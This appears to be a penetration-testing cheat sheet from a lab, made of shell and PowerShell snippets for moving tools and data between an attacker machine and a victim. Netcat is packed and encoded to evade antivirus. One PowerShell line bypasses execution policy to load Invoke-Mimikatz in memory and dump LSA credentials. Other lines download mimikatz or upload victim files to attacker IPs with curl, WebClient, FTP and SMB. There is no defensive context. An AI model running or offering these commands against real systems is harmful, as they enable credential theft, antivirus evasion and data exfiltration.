### UPX
```shell
upx -9 nc.exe
```

### exe2hex

```shell
exe2hex -x nc.exe -p nc.cmd
```

### base64

```shell
cat nc.cmd | base64 > nc.b64
```

### Download and memory execute

```powershell
#IWR works with new powershell versions / kinda AV
powershell.exe -exec Bypass -C 'IEX (IWR http://192.168.119.216/Invoke-Mimikatz.ps1 -UsebasicParsing);Invoke-Mimikatz -Command \" "privilege::debug" "token::elevate" "lsadump::lsa" \" '

#Old version powershell => New-object
powershell -exec bypass -c 'IEX (New-Object Net.WebClient).downloadString(http://192.168.119.201/mimikatz.exe)'

Invoke-WebRequest -Uri 'http://192.168.119.216/mimikatz.exe' -OutFile a.exe

```


### Upload a FIle: 

```shell
wget https://gist.githubusercontent.com/UniIsland/3346170/raw/059aca1d510c615df3d9fedafabac4d538ebe352/SimpleHTTPServerWithUpload.py ; chmod +x SimpleHTTPServerWithUpload.py; ./SimpleHTTPServerWithUpload.py
```

```shell
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.157.131/', 'bash.txt')

Invoke-RestMethod -Uri http://192.168.157.131/ -Method Post -inFile .\bash.txt 

powershell -ep bypass -c '$wc=New-Object System.Net.WebClient;$wc.UploadFile("http://192.168.157.131/", "POST", ".\bash.txt");'

curl -X POST --upload-file .\bash.txt http://192.168.119.237/
```


### FTP

```shell
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd

```


```powershell
ftp -v -n -s:ftp.txt
```

### smb

On Attacking machine: 

```shell
impacket-smbserver MyShare .
```

On Windows Machine

```shell
net use * \\192.168.119.216\MyShare
```